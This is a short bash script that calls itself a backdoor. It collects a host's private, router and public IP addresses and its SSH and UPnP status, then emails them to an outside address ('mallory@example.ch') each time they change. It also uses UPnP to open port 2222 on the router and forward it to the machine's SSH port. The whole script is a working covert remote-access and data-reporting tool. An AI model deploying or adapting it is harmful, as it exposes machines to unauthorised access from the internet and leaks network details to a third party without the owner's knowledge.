#!/bin/bash
# **WARNING** emails will probably end up in your spam folder!

# REQUIREMENTS for backdoor:
# * ip (for network scan)
# * curl (for network scan)
# * ipecho.net/plain website must be up (for network scan)
# * postfix or sendmail daemon running (for sending emails)
# * md5sum (for hashing of data)
# * miniupnp client (for upnp configuration)

#--------------------------BACKDOOR CONFIGURATION:-----------------------------------------------
backdoor=~/.backdoor # default -> root, change "User" in backdoor.service
emailaddress='mallory@example.ch'

#-----------------------------MAIN FUNCTIONS:------------------------------------------------
function getdata # Gather Statistics
{
# GET DATA
    ip_private=$(ip route get 1 | sed -r -n 's/.*src (([0-9]{1,3}[.]){3,3}[0-9]{1,3}).*/\1/p') # long live sed
    ip_router=$(ip route get 1 | sed -r -n 's/.*via (([0-9]{1,3}[.]){3,3}[0-9]{1,3}).*/\1/p')
    ip_public=$(curl -s ipecho.net/plain) # -s kills progress output
    #systemctl | grep -F $sshservice &>/dev/null && ssh='ENABLED' || ssh='DISABLED'
    pidof sshd &>/dev/null && ssh='ENABLED' || ssh='DISABLED'
    upnpc -P | grep -F -i 'found valid igd' &>/dev/null && upnp='ENABLED' || upnp='DISABLED'
    [[ $upnp == 'ENABLED' ]] && upnpc -l | grep -E "TCP\s*2222->${ip_private}:22" &>/dev/null && port='OPEN' || port='CLOSED'

# ECHO DATA
    echo -e "IP PRIVATE\t   - $ip_private"
    echo -e "IP ROUTER\t    - $ip_router"
    echo -e "IP PUBLIC\t    - $ip_public"
    echo -e "SSH\t          -> $ssh"
    echo -e "UPNP\t         -> $upnp"
    echo -e "PORT\t         -> $port"
}

function run
{
# IF NETWORK IS DOWN, ABORT
    ip route get 1 2>&1 | grep -i 'unreachable' &>/dev/null && exit # abort if down

# CHECK NETWORK OR SSH CHANGES
    data=$(getdata)
    [[ -f $backdoor ]] && oldhash=$(cat $backdoor) || oldhash="" # get hash value, if it exists
    newhash=$(echo "$data" | md5sum) # hash network info
    [[ $oldhash == $newhash ]] && exit
    echo "$newhash" >$backdoor

# NETWORK HAS CHANGED:
    # 1. send email
    # (can verify with `mailq`)
    echo -e "$(date)\n$data" | mail -s 'BACKDOOR' $emailaddress # requires postfix or sendmail daemon
    # 2. update upnp mapping (because dhcp change, or new pub ip, or upnp port not yet open)
    # (can verify with `upnpc -l`)
    upnpc -d 2222 TCP # requires miniupnp
    upnpc -a $ip_private 22 2222 TCP
}

#------------------------------MAIN SCRIPT:-------------------------------------------
[[ $# -eq 1 ]] && [[ $1 == 'run' ]] && $1
exit
